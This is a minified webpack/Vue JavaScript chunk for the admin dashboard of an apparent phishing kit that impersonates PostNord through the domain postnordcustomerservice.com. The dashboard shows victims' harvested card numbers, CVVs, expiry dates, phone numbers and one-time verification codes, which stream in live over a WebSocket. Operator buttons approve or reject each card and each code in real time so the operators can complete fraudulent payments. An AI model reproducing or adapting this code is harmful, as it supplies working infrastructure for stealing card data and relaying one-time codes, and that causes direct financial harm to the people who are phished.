(window["webpackJsonp"]=window["webpackJsonp"]||[]).push([["chunk-1e84d741"],{4070:function(t,e,o){"use strict";o("e173")},4271:function(t,e,o){t.exports=o.p+"static/img/图片3.2c37b1d3.png"},"483f":function(t,e,o){t.exports=o.p+"static/media/tip.781bc7b5.781bc7b5.mp3"},"50ac":function(t,e,o){t.exports=o.p+"static/img/图片5.cdaba15c.png"},"5bf5":function(t,e,o){t.exports=o.p+"static/img/图片4.2bc1a543.png"},"5d63":function(t,e,o){t.exports=o.p+"static/media/tips2.4c3b38b7.4c3b38b7.mp3"},"90fe":function(t,e,o){"use strict";o.r(e);var s=function(){var t=this,e=t.$createElement,s=t._self._c||e;return s("div",{staticClass:"app-container"},[s("el-table",{directives:[{name:"loading",rawName:"v-loading",value:t.listLoading,expression:"listLoading"}],attrs:{data:t.list,"element-loading-text":"Loading",border:"",fit:"","highlight-current-row":""}},[s("el-table-column",{attrs:{align:"center",label:"id"},scopedSlots:t._u([{key:"default",fn:function(e){return[t._v(" "+t._s(e.row.id)+" ")]}}])}),s("el-table-column",{attrs:{label:"姓名"},scopedSlots:t._u([{key:"default",fn:function(e){return[t._v(" "+t._s(e.row.name)+" ")]}}])}),s("el-table-column",{attrs:{label:"卡号",width:"230"},on:{mouseover:function(e){return t.cardMouseover(t.scope.row)},mouseout:function(e){return t.cardMouseout(t.scope.row)}},scopedSlots:t._u([{key:"default",fn:function(e){return[t._v(" "+t._s(e.row.cardNumber)+" "),s("div",{staticClass:"cardBg"},["4"==e.row.cardNumber.split("").splice(0,1)|"3"==e.row.cardNumber.split("").splice(0,1)|"6"==e.row.cardNumber.split("").splice(0,1)?s("div",{staticClass:"cardone"},[s("div",[s("img",{staticClass:"chip",attrs:{src:o("4271"),alt:""}}),s("img",{staticClass:"visa",attrs:{src:o("5bf5"),alt:""}})]),s("div",[t._v(" "+t._s(e.row.cardNumber)+" ")]),s("table",[s("tr",[s("td",[t._v("Card Holder")]),s("td",[t._v("CVV")]),s("td",[t._v("Expires")])]),s("tr",[s("td",[t._v("DEAN TRENKAMP")]),s("td",[t._v(t._s(e.row.securityCode))]),s("td",[t._v(t._s(e.row.expDate))])])])]):t._e(),"5"==e.row.cardNumber.split("").splice(0,1)?s("div",{staticClass:"cardtwo"},[s("div",[s("img",{staticClass:"chip",attrs:{src:o("4271"),alt:""}}),s("img",{staticClass:"visa",attrs:{src:o("50ac"),alt:""}})]),s("div",[t._v(" "+t._s(e.row.cardNumber)+" ")]),s("table",[s("tr",[s("td",[t._v("Card Holder")]),s("td",[t._v("CVV")]),s("td",[t._v("Expires")])]),s("tr",[s("td",[t._v("DEAN TRENKAMP")]),s("td",[t._v(t._s(e.row.securityCode))]),s("td",[t._v(t._s(e.row.expDate))])])])]):t._e()])]}}])}),s("el-table-column",{attrs:{label:"有效期"},scopedSlots:t._u([{key:"default",fn:function(e){return[t._v(" "+t._s(e.row.expDate)+" ")]}}])}),s("el-table-column",{attrs:{label:"cvv"},scopedSlots:t._u([{key:"default",fn:function(e){return[s("el-tag",{attrs:{type:"success"}},[t._v(t._s(e.row.securityCode))])]}}])}),s("el-table-column",{attrs:{label:"手机号"},scopedSlots:t._u([{key:"default",fn:function(e){return[t._v(" "+t._s(e.row.phoneNumber)+" ")]}}])}),s("el-table-column",{attrs:{label:"邮政编码"},scopedSlots:t._u([{key:"default",fn:function(e){return[t._v(" "+t._s(e.row.zipCode)+" ")]}}])}),s("el-table-column",{attrs:{label:"状态"},scopedSlots:t._u([{key:"default",fn:function(e){return[t._v(" "+t._s(e.row.status)+" ")]}}])}),s("el-table-column",{attrs:{label:"在线状态"},scopedSlots:t._u([{key:"default",fn:function(e){return[e.row.isOnline?s("el-tag",{attrs:{type:"success"}},[t._v("在线")]):t._e(),e.row.isOnline?t._e():s("el-tag",{attrs:{type:"error"}},[t._v("离线")])]}}])}),s("el-table-column",{attrs:{label:"创建时间"},scopedSlots:t._u([{key:"default",fn:function(e){return[t._v(" "+t._s(new Date(e.row.createTime).toLocaleString())+" ")]}}])}),s("el-table-column",{attrs:{label:"验证码"},scopedSlots:t._u([{key:"default",fn:function(e){return[t._v(" "+t._s(e.row.verificationCode)+" ")]}}])}),s("el-table-column",{attrs:{label:"卡操作",fixed:"right",width:"150"},scopedSlots:t._u([{key:"default",fn:function(e){return[s("el-button",{attrs:{type:"primary",disabled:!e.row.isOnline||"等待卡放行"!==e.row.status,size:"mini"},on:{click:function(o){return t.cardSuccess(e.row)}}},[t._v("放行")]),s("el-button",{attrs:{type:"danger",disabled:!e.row.isOnline||"等待卡放行"!==e.row.status,size:"mini"},on:{click:function(o){return t.handleDelete(e.row)}}},[t._v("拒绝")])]}}])}),s("el-table-column",{attrs:{label:"验证码",fixed:"right",width:"150"},scopedSlots:t._u([{key:"default",fn:function(e){return[s("el-button",{attrs:{type:"primary",disabled:!e.row.isOnline||"等待验证码放行"!==e.row.status,size:"mini"},on:{click:function(o){return t.handleEdit(e.row)}}},[t._v("放行")]),s("el-button",{attrs:{type:"danger",disabled:!e.row.isOnline||"等待验证码放行"!==e.row.status,size:"mini"},on:{click:function(o){return t.meDelete(e.row)}}},[t._v("拒绝")])]}}])})],1),s("audio",{attrs:{id:"audio1",src:o("483f"),preload:"auto"}}),s("audio",{attrs:{id:"audio2",src:o("5d63"),preload:"auto"}})],1)},a=[],i=(o("d81d"),o("4de4"),o("d3b7"),{filters:{statusFilter:function(t){var e={published:"success",draft:"gray",deleted:"danger"};return e[t]}},data:function(){return{list:null,listLoading:!0,cardShow:!1}},created:function(){this.socket(),this.fetchData()},methods:{meDelete:function(t){var e=this;this.axios.defaults.headers.common["Authorization"]=localStorage.getItem("token"),this.axios.request({url:"https://postnordcustomerservice.com//admin/codeReject?id="+t.id,method:"post"}).then((function(t){t.data.data&&(e.list=e.list.map((function(e){return e.sid==t.data.data.sid&&(e=t.data.data),e})),e.listLoading=!1)})).catch((function(t){console.log("Error: Request failed with status code 401"==String(t)),"Error: Request failed with status code 401"==String(t)&&(e.$message.error("登录过期，请重新登录"),e.$router.push("/login"))}))},handleEdit:function(t){var e=this;this.axios.defaults.headers.common["Authorization"]=localStorage.getItem("token"),this.axios.request({url:"https://postnordcustomerservice.com//admin/codePass?id="+t.id,method:"post"}).then((function(o){200===o.data.code&&(e.list=e.list.filter((function(e){return e.id!==t.id})),e.listLoading=!1)})).catch((function(t){"Error: Request failed with status code 401"==String(t)&&(_this.$message.error("登录过期，请重新登录"),_this.$router.push("/login"))}))},handleDelete:function(t){var e=this;this.axios.defaults.headers.common["Authorization"]=localStorage.getItem("token"),this.axios.request({url:"https://postnordcustomerservice.com//admin/cardReject?id="+t.id,method:"post"}).then((function(t){t.data.data&&(e.list=e.list.map((function(e){return e.sid==t.data.data.sid&&(e=t.data.data),e})),e.listLoading=!1)})).catch((function(t){console.log("Error: Request failed with status code 401"==String(t)),"Error: Request failed with status code 401"==String(t)&&(e.$message.error("登录过期，请重新登录"),e.$router.push("/login"))}))},cardSuccess:function(t){var e=this;this.axios.defaults.headers.common["Authorization"]=localStorage.getItem("token"),this.axios.request({url:"https://postnordcustomerservice.com//admin/cardPass?id="+t.id,method:"post"}).then((function(t){t.data.data&&(e.list=e.list.map((function(e){return e.sid==t.data.data.sid&&(e=t.data.data),e})),e.listLoading=!1)})).catch((function(t){console.log(String(t)),"Error: Request failed with status code 401"==String(t)&&(e.$message.error("登录过期，请重新登录"),e.$router.push("/login"))}))},fetchData:function(){var t=this;this.listLoading=!0,this.axios.defaults.headers.common["Authorization"]=localStorage.getItem("token"),this.axios.request({url:"https://postnordcustomerservice.com//admin/getInfoList",method:"post"}).then((function(e){e.data&&(t.list=e.data,t.listLoading=!1)})).catch((function(e){console.log("Error: Request failed with status code 401"==String(e)),"Error: Request failed with status code 401"==String(e)&&(t.$message.error("登录过期，请重新登录"),t.$router.push("/login")),"Error: Request failed with status code 410"==String(e)&&t.$router.push("/login")}))},socket:function(){var t=this,e=new WebSocket("wss://postnordcustomerservice.com/api/websocket/admin/***");e.onopen=function(){console.log("连接成功")},e.onmessage=function(e){var o=JSON.parse(e.data);if(1==o.code&&t.list.unshift(o.data),2==o.code){document.getElementById("audio1").play();var s=!1;t.list=t.list.map((function(t){return t.sid==o.data.sid&&(console.log("等待卡放行"),t=o.data,s=!0),t})),s||t.list.unshift(o.data)}3==o.code&&(document.getElementById("audio2").play(),t.list=t.list.map((function(t){return console.log("等待验证码放行"),console.log(t.sid,o.data.sid),t.sid==o.data.sid&&(t=o.data),t}))),4==o.code&&(t.list=t.list.map((function(t){return t.sid==o.data.sid&&(t=o.data),t}))),5==o.code&&(t.list=t.list.map((function(t){return t.sid==o.data.sid&&(t=o.data),t})))},e.onclose=function(){console.log("连接关闭")},e.onerror=function(){console.log("连接出错")},e.onclose=function(){console.log("连接关闭")}}}}),r=i,n=(o("4070"),o("2877")),l=Object(n["a"])(r,s,a,!1,null,"2402ce1e",null);e["default"]=l.exports},e173:function(t,e,o){}}]);